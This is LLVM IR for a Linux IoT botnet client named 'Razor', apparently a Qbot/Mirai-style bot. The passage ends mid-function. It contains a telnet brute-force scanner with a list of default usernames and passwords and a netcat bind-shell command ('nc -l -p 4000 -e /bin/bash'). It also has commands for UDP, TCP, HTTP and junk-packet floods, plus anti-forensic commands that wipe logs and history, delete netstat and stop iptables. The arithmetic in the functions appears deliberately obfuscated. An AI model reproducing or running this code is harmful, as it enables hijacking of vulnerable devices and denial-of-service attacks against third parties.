; ModuleID = 'host/ir_sub/Razor.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i32, i16, i8* }
%struct.udphdr = type { %union.anon.2 }
%union.anon.2 = type { %struct.anon.3 }
%struct.anon.3 = type { i16, i16, i16, i16 }
%struct.anon.1 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.state_t = type { i32, i8 }
%struct.ifreq = type { %union.anon.6, %union.anon.7 }
%union.anon.6 = type { [16 x i8] }
%union.anon.7 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@infectline = global i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i32 0, i32 0), align 8
@.str = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@commServer = global [1 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i32 0, i32 0)], align 8
@.str.1 = private unnamed_addr constant [8 x i8] c"IP:PORT\00", align 1
@uastrings = global [36 x i8*] [i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([134 x i8], [134 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.37, i32 0, i32 0)], align 16
@.str.2 = private unnamed_addr constant [74 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00", align 1
@.str.3 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00", align 1
@.str.4 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00", align 1
@.str.5 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00", align 1
@.str.6 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.7 = private unnamed_addr constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00", align 1
@.str.8 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00", align 1
@.str.9 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00", align 1
@.str.10 = private unnamed_addr constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00", align 1
@.str.11 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.12 = private unnamed_addr constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00", align 1
@.str.13 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00", align 1
@.str.14 = private unnamed_addr constant [15 x i8] c"wii libnup/1.0\00", align 1
@.str.15 = private unnamed_addr constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00", align 1
@.str.16 = private unnamed_addr constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00", align 1
@.str.17 = private unnamed_addr constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00", align 1
@.str.18 = private unnamed_addr constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00", align 1
@.str.19 = private unnamed_addr constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.20 = private unnamed_addr constant [78 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100\00", align 1
@.str.21 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.22 = private unnamed_addr constant [60 x i8] c"Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01\00", align 1
@.str.23 = private unnamed_addr constant [92 x i8] c"Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62\00", align 1
@.str.24 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00", align 1
@.str.25 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\00", align 1
@.str.26 = private unnamed_addr constant [119 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19\00", align 1
@.str.27 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)\00", align 1
@.str.28 = private unnamed_addr constant [81 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)\00", align 1
@.str.29 = private unnamed_addr constant [134 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0\00", align 1
@.str.30 = private unnamed_addr constant [83 x i8] c"SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.31 = private unnamed_addr constant [103 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\00", align 1
@.str.32 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0\00", align 1
@.str.33 = private unnamed_addr constant [80 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\00", align 1
@.str.34 = private unnamed_addr constant [67 x i8] c"MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0\00", align 1
@.str.35 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00", align 1
@.str.36 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000\00", align 1
@.str.37 = private unnamed_addr constant [67 x i8] c"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@usernames = global [19 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.56, i32 0, i32 0)], align 16
@.str.38 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.39 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.40 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.41 = private unnamed_addr constant [7 x i8] c"login\00\00", align 1
@.str.42 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.43 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@.str.44 = private unnamed_addr constant [9 x i8] c"netgear\00\00", align 1
@.str.45 = private unnamed_addr constant [7 x i8] c"cisco\00\00", align 1
@.str.46 = private unnamed_addr constant [6 x i8] c"ubnt\00\00", align 1
@.str.47 = private unnamed_addr constant [8 x i8] c"telnet\00\00", align 1
@.str.48 = private unnamed_addr constant [15 x i8] c"Administrator\00\00", align 1
@.str.49 = private unnamed_addr constant [9 x i8] c"comcast\00\00", align 1
@.str.50 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.51 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@.str.52 = private unnamed_addr constant [8 x i8] c"D-Link\00\00", align 1
@.str.53 = private unnamed_addr constant [9 x i8] c"manager\00\00", align 1
@.str.54 = private unnamed_addr constant [4 x i8] c"pi\00\00", align 1
@.str.55 = private unnamed_addr constant [7 x i8] c"VTech\00\00", align 1
@.str.56 = private unnamed_addr constant [9 x i8] c"vagrant\00\00", align 1
@passwords = global [26 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.64, i32 0, i32 0)], align 16
@.str.57 = private unnamed_addr constant [8 x i8] c"123456\00\00", align 1
@.str.58 = private unnamed_addr constant [10 x i8] c"changeme\00\00", align 1
@.str.59 = private unnamed_addr constant [6 x i8] c"1234\00\00", align 1
@.str.60 = private unnamed_addr constant [11 x i8] c"raspberry\00\00", align 1
@.str.61 = private unnamed_addr constant [15 x i8] c"vagrant\00, 123\00\00", align 1
@.str.62 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.63 = private unnamed_addr constant [10 x i8] c"dreambox\00\00", align 1
@.str.64 = private unnamed_addr constant [6 x i8] c"test\00\00", align 1
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.132 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.65 = private unnamed_addr constant [9 x i8] c"buf: %s\0A\00", align 1
@fdopen_pids = internal global i32* null, align 8
@.str.66 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.67 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.68 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.69 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.70 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.71 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.72 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@.str.73 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.74 = private unnamed_addr constant [45 x i8] c"screen -dmSL asdf nc -l -p 4000 -e /bin/bash\00", align 1
@.str.75 = private unnamed_addr constant [6 x i8] c"ogin:\00", align 1
@.str.76 = private unnamed_addr constant [9 x i8] c"assword:\00", align 1
@.str.77 = private unnamed_addr constant [38 x i8] c"[RAZOR] \1B[34mATTEMPT \1B[37m-> %s:%s:%s\00", align 1
@.str.78 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.79 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.80 = private unnamed_addr constant [39 x i8] c"[RAZOR] \1B[32mEXECUTED \1B[37m-> %s:%s:%s\00", align 1
@.str.81 = private unnamed_addr constant [43 x i8] c"[RAZOR] \1B[31mUNSUCCESSFUL \1B[37m-> %s:%s:%s\00", align 1
@.str.82 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.83 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.84 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.85 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.86 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.87 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.88 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.89 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.90 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.91 = private unnamed_addr constant [11 x i8] c"GETLOCALIP\00", align 1
@.str.92 = private unnamed_addr constant [10 x i8] c"My IP: %s\00", align 1
@.str.93 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.94 = private unnamed_addr constant [17 x i8] c"SCANNER ON | OFF\00", align 1
@.str.95 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.96 = private unnamed_addr constant [24 x i8] c"STOPPING TELNET SCANNER\00", align 1
@.str.97 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.98 = private unnamed_addr constant [24 x i8] c"STARTING TELNET SCANNER\00", align 1
@.str.99 = private unnamed_addr constant [5 x i8] c"HOLD\00", align 1
@.str.100 = private unnamed_addr constant [5 x i8] c"JUNK\00", align 1
@.str.101 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.102 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.103 = private unnamed_addr constant [4 x i8] c"CNC\00", align 1
@.str.104 = private unnamed_addr constant [6 x i8] c"COMBO\00", align 1
@.str.105 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.106 = private unnamed_addr constant [9 x i8] c"KILLATTK\00", align 1
@.str.107 = private unnamed_addr constant [8 x i8] c"GTFOFAG\00", align 1
@.str.108 = private unnamed_addr constant [8 x i8] c"FATCOCK\00", align 1
@.str.109 = private unnamed_addr constant [21 x i8] c"rm -rf /var/log/wtmp\00", align 1
@.str.110 = private unnamed_addr constant [14 x i8] c"rm -rf /tmp/*\00", align 1
@.str.111 = private unnamed_addr constant [11 x i8] c"history -c\00", align 1
@.str.112 = private unnamed_addr constant [23 x i8] c"rm -rf ~/.bash_history\00", align 1
@.str.113 = private unnamed_addr constant [20 x i8] c"rm -rf /bin/netstat\00", align 1
@.str.114 = private unnamed_addr constant [11 x i8] c"history -w\00", align 1
@.str.115 = private unnamed_addr constant [16 x i8] c"killall -9 perl\00", align 1
@.str.116 = private unnamed_addr constant [22 x i8] c"service iptables stop\00", align 1
@.str.117 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.118 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.119 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.120 = private unnamed_addr constant [6 x i8] c"RAZER\00", align 1
@.str.121 = private unnamed_addr constant [19 x i8] c"/usr/sbin/dropbear\00", align 1
@.str.122 = private unnamed_addr constant [10 x i8] c"BUILD %s\0A\00", align 1
@.str.123 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.124 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.125 = private unnamed_addr constant [9 x i8] c"BUILD %s\00", align 1
@.str.126 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.127 = private unnamed_addr constant [6 x i8] c"DUPPP\00", align 1
@.str.128 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.129 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.130 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.131 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1948185366
  %7 = add i32 %6, -1640531527
  %8 = sub i32 %7, -1948185366
  %9 = add i32 %5, -1640531527
  store i32 %8, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %10 = load i32, i32* %2, align 4
  %11 = sub i32 %10, -1472763587
  %12 = add i32 %11, -1640531527
  %13 = add i32 %12, -1472763587
  %14 = add i32 %10, -1640531527
  %15 = sub i32 0, %13
  %16 = sub i32 0, -1640531527
  %17 = add i32 %15, %16
  %18 = sub i32 0, %17
  %19 = add i32 %13, -1640531527
  store i32 %18, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %20

; <label>:20:                                     ; preds = %66, %1
  %21 = load i32, i32* %3, align 4
  %22 = icmp slt i32 %21, 4096
  br i1 %22, label %23, label %73

; <label>:23:                                     ; preds = %20
  %24 = load i32, i32* %3, align 4
  %25 = sub i32 %24, 1692826066
  %26 = sub i32 %25, 3
  %27 = add i32 %26, 1692826066
  %28 = sub nsw i32 %24, 3
  %29 = sext i32 %27 to i64
  %30 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %29
  %31 = load i32, i32* %30, align 4
  %32 = load i32, i32* %3, align 4
  %33 = sub i32 0, 2
  %34 = add i32 %32, %33
  %35 = sub nsw i32 %32, 2
  %36 = sext i32 %34 to i64
  %37 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %36
  %38 = load i32, i32* %37, align 4
  %39 = xor i32 %31, -1
  %40 = and i32 -1695713261, %39
  %41 = xor i32 -1695713261, -1
  %42 = and i32 %31, %41
  %43 = xor i32 %38, -1
  %44 = and i32 %43, -1695713261
  %45 = and i32 %38, %41
  %46 = or i32 %40, %42
  %47 = or i32 %44, %45
  %48 = xor i32 %46, %47
  %49 = xor i32 %31, %38
  %50 = xor i32 %48, -1
  %51 = and i32 -1640531527, %50
  %52 = xor i32 -1640531527, -1
  %53 = and i32 %48, %52
  %54 = or i32 %51, %53
  %55 = xor i32 %48, -1640531527
  %56 = load i32, i32* %3, align 4
  %57 = xor i32 %54, -1
  %58 = and i32 %56, %57
  %59 = xor i32 %56, -1
  %60 = and i32 %54, %59
  %61 = or i32 %58, %60
  %62 = xor i32 %54, %56
  %63 = load i32, i32* %3, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %64
  store i32 %61, i32* %65, align 4
  br label %66

; <label>:66:                                     ; preds = %23
  %67 = load i32, i32* %3, align 4
  %68 = sub i32 0, %67
  %69 = sub i32 0, 1
  %70 = add i32 %68, %69
  %71 = sub i32 0, %70
  %72 = add nsw i32 %67, 1
  store i32 %71, i32* %3, align 4
  br label %20

; <label>:73:                                     ; preds = %20
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, -850642602
  %7 = add i32 %6, 1
  %8 = sub i32 %7, -850642602
  %9 = add i32 %5, 1
  %10 = xor i32 %8, -1
